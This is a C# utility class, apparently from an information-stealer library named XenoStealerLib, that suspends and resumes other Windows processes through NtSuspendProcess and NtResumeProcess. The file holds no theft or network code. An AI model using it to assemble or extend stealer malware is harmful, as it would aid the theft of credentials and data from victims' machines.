using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace XenoStealerLib.Utils
{
    public class ProcessPauser
    {
        private IntPtr Process;
        public bool worked;
        private static uint PROCESS_SUSPEND_RESUME = 0x0800;
        public ProcessPauser(int pid, bool DontAffectSelf=true) 
        {

            if (DontAffectSelf && SimpleProcessStuff.isCurrentProcessUnderPid(pid))
            {
                worked = false;
                return;
            }
            Process = NativeMethods.OpenProcess(PROCESS_SUSPEND_RESUME, false, (uint)pid);
            worked = Process != IntPtr.Zero;
        }

        public void Pause() 
        {
            if (worked) 
            {
                NativeMethods.NtSuspendProcess(Process);
            }
        }

        public static void Pause(int pid, bool DontFreezeSelf=true) 
        {
            if (DontFreezeSelf && SimpleProcessStuff.isCurrentProcessUnderPid(pid)) 
            {
                return;  
            }
            IntPtr handle = NativeMethods.OpenProcess(PROCESS_SUSPEND_RESUME, false, (uint)pid);
            if (handle == IntPtr.Zero) 
            {
                return;
            }
            NativeMethods.NtSuspendProcess(handle);
            NativeMethods.CloseHandle(handle);
        }

        public static void Resume(int pid, bool DontUnFreezeSelf=true)
        {
            if (DontUnFreezeSelf && SimpleProcessStuff.isCurrentProcessUnderPid(pid))
            {
                return;
            }
            IntPtr handle = NativeMethods.OpenProcess(PROCESS_SUSPEND_RESUME, false, (uint)pid);
            if (handle == IntPtr.Zero)
            {
                return;
            }
            NativeMethods.NtResumeProcess(handle);
            NativeMethods.CloseHandle(handle);
        }

        public void Resume() 
        {
            if (worked)
            {
                NativeMethods.NtResumeProcess(Process);
            }
        }

        public void Dispose() 
        { 
            if (worked) 
            {
                NativeMethods.CloseHandle(Process);
            }
        }
    }
}
